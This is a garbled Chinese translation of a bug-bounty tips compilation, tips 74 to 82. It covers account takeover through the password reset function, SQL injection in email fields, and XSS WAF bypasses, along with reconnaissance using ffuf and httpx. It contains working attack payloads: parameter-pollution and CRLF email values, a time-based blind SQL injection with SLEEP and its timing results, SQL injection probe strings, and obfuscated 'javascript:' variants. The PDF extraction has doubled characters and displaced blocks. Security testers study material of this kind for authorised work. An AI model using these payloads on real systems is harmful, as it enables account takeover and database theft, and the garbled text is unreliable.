这个提示可以通过向Web应⽤用程序的密码重置功能提供额外的辅助电⼦子邮件来帮助寻找账户接管漏漏洞洞。
尝试以下有效payloads。
双参数（也就是HPP/HTTP参数污染）。
email=PI:EMAIL&email=PI:EMAIL
拷⻉贝转码:
email=PI:EMAIL%0a%0dcc:PI:EMAIL
使⽤用分隔器器:
email=PI:EMAIL,hacker@xyz.tldemail=PI:EMAIL%20hacker@xyz.tldemail
=PI:EMAIL|PI:EMAIL
没有域名:
email=victim
没有顶级域名(Top Level Domain):
email=victim@xyz
JSON表:
{"email":["PI:EMAIL","PI:EMAIL"]}
⽹网络应⽤用有可能会接受第⼆二个电⼦子邮件地址(PI:EMAIL)，并因此向两个电⼦子邮件发送重置链接。
75. 绕过电⼦子邮件过滤器器，导致SQL注⼊入（JSON）。
By @HackENews
Source: link
这⾥里里还有⼀一个⼩小技巧，对密码重置功能的测试很有帮助。
利利⽤用以下⾮非典型电⼦子邮件地址格式的有效载荷示例例，笔者能够在Web应⽤用程序中发现SQL注⼊入。
GET /passwordreset
验室制作翻译出品
Payload
Result
Injection
Status
Description
{“email”:”PI:EMAIL”}
{“code”:2002,”status”:200,”message”:”Email
not found.”}
Valid
{“email”:”asd PI:EMAIL”}
{“code”:2002,”status”:200,”message”:”Bad
format”}
Not Valid
{“email”:”\”asd a\”@a.com”}
{“code”:2002,”status”:200,”message”:”Bad
format”}
Not Valid
{“email”:”asd(a)@a.com”}
{“code”:2002,”status”:200,”message”:”Bad
format”}
Not Valid
{“email”:”\”asd(a)\”@a.com”}
{“code”:2002,”status”:200,”message”:”Email
not found.”}
Valid
{“email”:”asd’PI:EMAIL”}
{“code”:0,”status”:500,”message”:”Unspecified
error”}
Not Valid
{“email”:”asd’or’1’=’PI:EMAIL”}
{“code”:2002,”status”:200,”message”:”Email
not found.”}
Valid
{“email”:”a’-IF(LENGTH(database())>9,SLEEP(7),0)or’1’=’1
@a.com”}
{“code”:2002,”status”:200,”message”:”Bad
format”}
Not Valid
{“email”:”\”a’-
IF(LENGTH(database())>9,SLEEP(7),0)or’1’=’1\”@a.com”}
{“code”:0,”status”:200,”message”:”Successful”}
Valid
Delay: 7,854
milis
{“email”:”\”a’-
IF(LENGTH(database())=10,SLEEP(7),0)or’1’=’1\”@a.com”}
{“code”:0,”status”:200,”message”:”Successful”}
Valid
Delay: 8,696
milis
{“email”:”\”a’-
IF(LENGTH(database())=11,SLEEP(7),0)or’1’=’1\”@a.com”}
{“code”:0,”status”:200,”message”:”Successful”}
Valid
No delay
在这个例例⼦子中，笔者能够确定数据库名称⻓长度为10个字符，作为概念验证。通过Sqlmap⾃自动化，
就可以根据数据库后台的情况，将整个数据库转储，甚⾄至实现RCE，得到⼀一个shell。
注意，SQL注⼊入是通过在at（@）字符前加引号（"）来触发的，这⾥里里。
"injection_here"@example.com.
带引号的电⼦子邮件地址是有效的电⼦子邮件地址，参⻅见RFC3696中的限制电⼦子邮件地址。
另请参⻅见相关提示BBT2-8和BBT5-11，同样使⽤用⾮非典型的电⼦子邮件地址格式。
76. ⽤用于识别 SQL 注⼊入的⼯工具 100%。
By @HackENews
Source: link
如果有的话，这就是100%发现SQL注⼊入的⽅方法。
验室制作翻译出品
使⽤用这些模式，例例如：
http://target.com/?q=HERE
77. 在在线沙箱数据库中测试您的SQL注⼊入。
By @hackerscrolls
Source: link
你是否发现了了⼀一个困难的SQL注⼊入，并想在真实的DB上调试它？但你没有时间启动真实的DB实例例？
使⽤用下⾯面的⽹网站来检查不不同DB中的语法和可⽤用的SQL命令。
SQL Fiddle(sqlfiddle.com)
DB Fiddle (db-fiddle.com)
EverSQL(eversql.com)
所有这些⽹网站都提供了了⼀一个在线沙箱数据库，⽤用于测试SQL查询。下⾯面是每个⽹网站上都有哪些数据库。
SQL Fiddle supports:
Oracle
SQLite
MySQL
PostgreSQL
MS SQL Server 2017
DB Fiddle supports:
MySQL
SQLite
PostgreSQL
(multiple versions)
EverSQL supports:
Oracle
MySQL
/?q=1
/?q=1'
/?q=1"
/?q=[1]
/?q[]=1
/?q=1`
/?q=1\
/?q=1/*'*/
/?q=1/*!1111'*/
/?q=1'||'asd'||'  <== concat string
/?q=1' or '1'='1
/?q=1 or 1=1
/?q='or''='
验室制作翻译出品
MariaDB
PostreSQL
MS SQL Server
Percona Server
Amazon Aurora MySQL
如果你需要调试SQL注⼊入或优化你的查询，这可能是⾮非常有⽤用的。
78. 绕过WAF屏蔽XSS中的 "javascript:"
By @SecurityMB (compiled by @intigriti)
Source: link
您是否正在通过 "javascript: "测试XSS，但它被WAF（Web应⽤用程序防⽕火墙）阻⽌止了了？试试下⾯面的绕
过。
在中间添加任意数量量的\n, \t or \r , 列列如:
java\nscript:
在开头加上 \x00-\x20 的字符, 列列如:
\x01javascript:
随机⼤大⼩小写，列列如:
jaVAscrIpt:
为什什么这些可以⼯工作？前两个例例⼦子在有效负载字符串串中添加了了不不可打印的字符，如SOH, STX, ETX, EOT, 
ENQ, ACK, BEL, backspace, escape key等。这些都是ASCII表开头的特殊终端控制字符（⻅见man 
ascii）。
WAF有可能会以 "⼆二进制⽅方式 "处理理有效payload字符串串和不不可打印的字符。这将有望导致WAF过滤规则
不不匹配任何东⻄西，⽽而实际的Web应⽤用程序将把它作为⽂文本处理理--没有那些不不可打印的特殊字符。
这些 WAF 绕过技术真的很⽅方便便! 试着⽤用它们来混淆有效payload的任何部分，⽽而不不仅仅是 "javascript: 
"部分。
79. 在没有证书的 Burp Pro中Burp Intruder使⽤用 (ffuf)
By @InsiderPhD (compiled by @intigriti)
Source: link
⼤大家可能都知道，如果你使⽤用的是免费版的Burp Suite(社区版)，在使⽤用Intruder⼯工具时，会有速度限
制。Intruder的攻击速度明显被节制，每⼀一次请求都会使攻击速度越来越慢。
使⽤用ffuf你可以轻松克服这个限制，并利利⽤用Burp的全部速度进⾏行行模糊处理理。只需在Burp中关闭Proxy 
Interception，然后⽤用你的wordlist运⾏行行ffuz就可以了了。
这将启动ffuf并重放Burp中每个匹配的（⾮非404）结果，在HTTP历史记录的Proxy标签中显示。
ffuf -c -w ./wordlist.txt -u https://target/FUZZ -replay-proxy 
http://localhost:8080
验室制作翻译出品
请注意，ffuf也有 -x 选项（HTTP代理理URL），它将导致所有的请求通过Burp，⽽而不不仅仅是匹配的请
求。
然后，你会看到所有的请求都显示在Burp中。
理理论上，wufzz等类似⼯工具的流量量也可以通过代理理达到类似的效果。如果你没有Burp Pro，但⼜又想快速
地模糊，这真的很不不错!
这⾥里里是获取ffuf的地⽅方。
https://github.com/ffuf/ffuf
80. 如何快速识别会话⽆无效问题
By @Begin_hunt
Source: link
这是⼀一个快速的⼩小技巧，可以快速找到Web应⽤用程序在注销后是否正确⽆无效会话，或者是否存在缓存控
制安全问题。
1. 登录应⽤用程序
2. 浏览⽹网⻚页
3. 登出
4. 按( Alt + 左箭头 ) 按钮。
5. 如果你已经登录或者可以查看⽤用户之前导航的⻚页⾯面，那就给⾃自⼰己拍⼀一拍。
这样的应⽤用⾏行行为⾄至少可以说明P4的bug，其根本原因要么。
ffuf -c -w ./wordlist.txt -u https://target/FUZZ -x http://localhost:8080
验室制作翻译出品
不不正确的会话⽆无效（注销后cookies仍然有效）。
缺少安全标题
不不安全的缓存控制
这类BUG在学校、图书馆、⽹网吧等类似的地⽅方存在安全隐患，因为这些地⽅方的电脑经常被多⼈人重复使
⽤用。
如果⼀一个⼈人正在浏览⼀一个有敏敏感信息的重要⻚页⾯面并注销，然后另⼀一个⼈人来点击回去（因为第⼀一个⼈人没有
关闭浏览器器），那么敏敏感数据就可能暴暴露露。
81. 使⽤用httpx轻松发现信息泄露露
By @Alra3ees
Source: link
使⽤用httpx，我们可以很容易易地识别主机列列表是否暴暴露露了了⼀一些有趣的端点，如服务器器状态⻚页⾯面、诊断性⽹网
络控制台或其他⼀一些可能包含敏敏感信息的信息⻚页⾯面。这⾥里里有三种有趣的情况。
1）检查是否有主机暴暴露露了了Apache服务器器状态⻚页。
2) 检查是否有主机暴暴露露了了JBoss web控制台。
3) 检查是否有主机暴暴露露了了phpinfo调试⻚页⾯面。
所有这些情况都可能提供有价值的信息，包括⽬目标系统的敏敏感信息、配置、披露露物理理⽂文件路路径位置、内
部IP地址等。
提示。我们还可以检查更更多的端点(URI)。请看⼀一下专⻔门的 Content-discovery github 仓库，在那⾥里里可以
使⽤用这些特殊的词表来识别上述三种情况。:
https://github.com/imrannissar/Content-discovery/blob/master/quickhits.txt (2376 entries)
https://github.com/imrannissar/Content-discovery/blob/master/cgis.txt (3388 entries)
https://github.com/imrannissar/Content-discovery/blob/master/combined.txt (8887 entries)
https://github.com/imrannissar/Content-discovery/blob/master/content_discovery_all.txt 
(373535 entries)
82. 导致暴暴露露调试端点的收集
By @_justYnot
Source: link
cat hosts.txt | httpx -path /server-status?full=true -status-code -content-